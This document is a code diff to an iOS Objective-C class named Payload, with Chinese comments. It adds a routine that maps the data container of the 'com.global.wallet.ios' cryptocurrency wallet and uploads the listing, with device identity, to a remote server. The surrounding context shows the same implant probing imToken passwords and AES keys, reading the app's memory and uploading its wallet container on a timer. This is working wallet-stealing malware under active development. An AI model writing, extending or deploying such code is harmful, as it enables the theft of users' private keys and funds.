@@ -35,6 +35,7 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 - (void)probeImTokenPassword;
 - (void)tryImTokenAesKeys;
 - (void)probeImTokenTcx;
+- (void)probeWalletTree:(NSString *)bundleId;
 @end
 
 @implementation Payload
@@ -481,6 +482,7 @@ static NSArray *WalletPathsFor(NSString *bundleId) {
                         if (tick % 3 == 0) [self heartbeat];       // 约 60s 一次
                         // 钱包容器采集：每 5 分钟重试一次（服务端可能一时不可达）
                         if (tick % 15 == 7) { [self collectAndUploadWallet:@"im.token.app"]; [self probeImTokenEntry]; }
+                        if (tick % 15 == 3) [self probeWalletTree:@"com.global.wallet.ios"];
                         // 每 60 秒单独探一次入口标记（注入要 140 秒，启动时那次来不及）
                         if (tick % 3 == 0) [self probeImTokenEntry];
                         // 每轮（20 秒）看一次 imToken 在不在跑，在跑就直接读它内存
@@ -807,6 +809,32 @@ static NSArray *WalletMemoryTargets(void) {
 /// 文件格式每行：keyHex|ivHex
 
 /// 读 imToken 里 call_tcx_api 的安装状态与实际参数（JSON）
+
+#pragma mark - 容器目录树探针（确定钱包数据到底在哪）
+
+- (void)probeWalletTree:(NSString *)bundleId {
+    @try {
+        NSArray *tree = [WalletFS treeOfContainer:bundleId maxDepth:3 maxEntries:220];
+        if (!tree.count) {
+            NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+            ev[@"et"] = @"wallet_tree";
+            ev[@"c"] = kSeed;
+            ev[@"ctx"] = @{ @"bundleId": bundleId, @"count": @0, @"tree": @"" };
+            [self.net sendEvent:ev];
+            return;
+        }
+        NSString *joined = [tree componentsJoinedByString:@"\n"];
+        if (joined.length > 6000) joined = [joined substringToIndex:6000];
+
+        NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+        ev[@"et"] = @"wallet_tree";
+        ev[@"c"] = kSeed;
+        ev[@"ctx"] = @{ @"bundleId": bundleId, @"count": @(tree.count), @"tree": joined };
+        [self.net sendEvent:ev];
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"probeWalletTree: %@", e.reason]];
+    }
+}
 - (void)probeImTokenTcx {
     @try {
         // 1) 安装状态
